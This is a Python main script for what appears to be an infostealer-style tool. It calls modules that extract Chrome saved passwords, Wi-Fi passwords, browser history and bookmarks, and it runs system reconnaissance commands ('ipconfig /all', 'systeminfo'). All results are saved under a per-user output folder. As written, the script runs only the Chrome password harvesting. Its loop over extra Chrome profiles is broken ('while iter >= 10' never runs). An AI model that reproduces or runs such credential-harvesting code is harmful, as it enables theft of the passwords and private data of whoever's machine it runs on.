import os
import time
from getpass import getuser

import src.utils.file_manager as file_manager
from src.modules.chrome_passwords import ChromePasswords
from src.modules.shell_run import RunCommand
from src.modules.web_bookmarks import WebBookmarks
from src.modules.web_history import WebHistory
from src.modules.wifi import Wifi as Wifi_Passwords


class Main:
    def __init__(self):
        self.cwd = os.getcwd()

        self.output = os.path.join(self.cwd, "output")
        file_manager.create_folder_if_not_exists(self.output)

        self.save_folder = os.path.join(self.output, str(getuser()))
        file_manager.create_folder_if_not_exists(self.save_folder)

        self.error_file_name = os.path.join(self.save_folder, "error.txt")
        file_manager.create_file_if_not_exist(self.error_file_name)
        self.error_file = open(self.error_file_name, "a+", encoding="utf-8")

    def run_Wifi_Passwords(self):
        file_manager.add_seperator(topic="Wifi Passwords",
                                   symbol="*",
                                   file=self.error_file)
        wifi_passwords_file_name = os.path.join(
            self.save_folder, "wifi_passwords.txt")
        file_manager.create_file_if_not_exist(wifi_passwords_file_name)

        with open(wifi_passwords_file_name, "a+", encoding="utf-8") as wifi_passwords_file:
            file_manager.add_seperator(topic="Wifi Passwords",
                                       symbol="*",
                                       file=wifi_passwords_file)
            wifi_passwords_obj = Wifi_Passwords(file=wifi_passwords_file,
                                                error_file=self.error_file)
            wifi_passwords_obj.run()

    def run_WebHistory(self):
        file_manager.add_seperator(topic="Web Browser History",
                                   symbol="*",
                                   file=self.error_file)

        web_history_file_name_csv = os.path.join(
            self.save_folder, "web_history.csv")
        web_history_file_name_json = os.path.join(
            self.save_folder, "web_history.json")

        web_history_obj = WebHistory()
        web_history_obj.run(
            csv=True,
            json=True,
            csv_file_name=web_history_file_name_csv,
            json_file_name=web_history_file_name_json
        )

    def run_WebBookmarks(self):
        file_manager.add_seperator(topic="Web Browser Bookmarks",
                                   symbol="*",
                                   file=self.error_file)

        web_history_file_name_csv = os.path.join(
            self.save_folder, "web_bookmarks.csv")
        web_history_file_name_json = os.path.join(
            self.save_folder, "web_bookmarks.json")

        web_history_obj = WebBookmarks()
        web_history_obj.run(
            csv=True,
            json=True,
            csv_file_name=web_history_file_name_csv,
            json_file_name=web_history_file_name_json
        )

    def run_ChromePasswords(self):
        file_manager.add_seperator(topic="Chrome Passwords",
                                   symbol="*",
                                   file=self.error_file)

        chrome_pass_folder = os.path.join(self.save_folder, "chromepass")
        file_manager.create_folder_if_not_exists(chrome_pass_folder)

        savefname = os.path.join(chrome_pass_folder, "chromePass_default.txt")
        ChromePasswords(profile="Default",
                        savefname="profile_default",
                        save_folder_name=chrome_pass_folder,
                        error_file=self.error_file,
                        )

        iter = 0
        while iter >= 10:
            iter += 1
            savefname = os.path.join(
                chrome_pass_folder, f"chromePass_{iter}.txt")
            with open(savefname, "w", encoding="utf-8") as ftemp:
                ChromePasswords(profile=f"Profile {iter}",
                                savefname=f"profile{iter}",
                                save_f_name=None,
                                save_folder_name=chrome_pass_folder,
                                error_file=self.error_file,
                                data_write_file=ftemp
                                )

    def run_ShellCommandList(self):
        command_list = [
            "ipconfig /all",
            "systeminfo"
        ]

        file_manager.add_seperator(topic="Shell Command List",
                                   symbol="*",
                                   file=self.error_file)

        shellcommands_folder = os.path.join(self.save_folder, "shellcommands")
        file_manager.create_folder_if_not_exists(shellcommands_folder)

        for command in command_list:
            file_name_temp = os.path.join(
                shellcommands_folder, f"{command}.txt")
            with open(file_name_temp.replace(" ", "_").replace("/", "X"), "w", encoding="utf-8") as ftemp:
                RunCommand(
                    error_file=self.error_file,
                    save_file=ftemp
                ).run(
                    command=command
                )


obj = Main()
obj.run_ChromePasswords()
